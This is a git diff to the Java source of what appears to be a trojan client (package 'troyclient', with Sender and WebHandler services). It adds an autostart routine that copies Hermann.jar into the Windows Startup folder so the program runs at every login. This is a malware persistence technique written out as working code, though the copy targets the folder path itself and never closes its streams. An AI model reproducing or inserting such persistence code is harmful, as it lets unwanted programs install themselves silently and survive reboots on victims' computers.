@@ -4,6 +4,12 @@ import ch.lebois.troyclient.service.Console;
 import ch.lebois.troyclient.service.Sender;
 import ch.lebois.troyclient.service.WebHandler;
 
+import java.io.File;
+import java.io.FileInputStream;
+import java.io.FileOutputStream;
+import java.io.IOException;
+import java.nio.channels.FileChannel;
+
 /**
  * @author Felix
  * @date 21.02.2018
@@ -30,8 +36,22 @@ public class ConfigureInit {
     }
 
     private void autostart() {
-        System.out.println(System.getProperty("user.dir") + "\\hermann.jar");
-        System.out.println(System.getProperty("java.io.tmpdir").replace("Local\\Temp\\", "Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"));
+        try {
+            copyPaste(new File(System.getProperty("user.dir") + "\\Hermann.jar"),
+                    new File(System.getProperty("java.io.tmpdir").replace("Local\\Temp\\",
+                            "Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")));
+            System.out.println(System.getProperty("java.io.tmpdir").replace("Local\\Temp\\",
+                    "Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"));
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
+    }
+
+    private void copyPaste(File source, File dest) throws IOException {
+        FileChannel sourceChannel = new FileInputStream(source).getChannel();
+        FileChannel destChannel = new FileOutputStream(dest).getChannel();
+        destChannel.transferFrom(sourceChannel, 0, sourceChannel.size());
+
     }
 
     public void operatingSystem() {
